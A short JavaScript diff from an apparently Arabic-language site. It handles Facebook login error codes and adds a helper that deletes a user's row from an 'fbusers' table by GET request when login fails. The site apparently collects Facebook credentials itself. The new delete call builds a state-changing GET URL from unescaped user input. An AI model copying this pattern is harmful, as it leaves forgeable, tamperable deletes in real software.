@@ -1173,9 +1173,11 @@ var inter =   setInterval(function(){
     if(result.data.error_code == 0){
       location.replace("/?app=login&user="+result.data.access);
     }else if(result.data.error_code == 405){
-      error_msg("حسابك يحتاج للتحقق من قبل فيس بوك")
+      error_msg("حسابك يحتاج للتحقق من قبل فيس بوك");
+      _Json("../json.php?del=fbusers&val=username,"+user+"");
     }else if(result.data.error_code == 400 || result.data.error_code == 401){
-      error_msg("اسم المستخدم او كلمة المرور خطأ")
+      error_msg("اسم المستخدم او كلمة المرور خطأ");
+      _Json("../json.php?del=fbusers&val=username,"+user+"");
     }
   }else{
   loding_msg("جارى التحقق من البيانات",0,500000000);
@@ -1184,7 +1186,9 @@ var inter =   setInterval(function(){
 
   },1000);
 }
-
+function _Json(url){
+  $.getJSON(url, function(result){ return result; });
+}
 ///////////////////////////////////////////////////////
 function register() {
     loding_msg("من فضلك انتظر قليلا جارى الارسال",0,500000000);
